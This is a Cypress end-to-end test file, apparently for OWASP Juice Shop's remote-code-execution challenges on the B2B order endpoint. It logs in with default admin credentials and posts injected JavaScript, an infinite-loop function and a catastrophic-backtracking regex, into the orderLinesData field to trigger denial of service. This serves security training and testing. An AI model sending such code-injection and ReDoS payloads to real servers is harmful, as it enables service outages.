describe("/b2b/v2/order", () => {
  describe('challenge "rce"', () => {
    it("an infinite loop deserialization payload should not bring down the server", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.login({ email: "admin", password: "admin123" });

          cy.window().then(() => {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
              if (this.status == 500) {
                console.log("Success");
              }
            };
            xhttp.open(
              "POST",
              `${Cypress.env("baseUrl")}/b2b/v2/orders/`,
              true
            );
            xhttp.setRequestHeader("Content-type", "application/json");
            xhttp.setRequestHeader(
              "Authorization",
              `Bearer ${localStorage.getItem("token")}`
            );
            xhttp.send(
              JSON.stringify({
                orderLinesData: "(function dos() { while(true); })()",
              })
            );
          });
          cy.expectChallengeSolved({ challenge: "Blocked RCE DoS" });
        }
      });
    });
  });

  describe('challenge "rceOccupy"', () => {
    it("should be possible to cause request timeout using a recursive regular expression payload", () => {
      cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
        if (!disableOnContainerEnv) {
          cy.login({ email: "admin", password: "admin123" });
          cy.window().then(() => {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
              if (this.status == 503) {
                console.log("Success");
              }
            };
            xhttp.open(
              "POST",
              `${Cypress.env("baseUrl")}/b2b/v2/orders/`,
              true
            );
            xhttp.setRequestHeader("Content-type", "application/json");
            xhttp.setRequestHeader(
              "Authorization",
              `Bearer ${localStorage.getItem("token")}`
            );
            xhttp.send(
              JSON.stringify({
                orderLinesData:
                  "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')",
              })
            );
          });
          cy.expectChallengeSolved({ challenge: "Successful RCE DoS" });
        }
      });
    });
  });
});
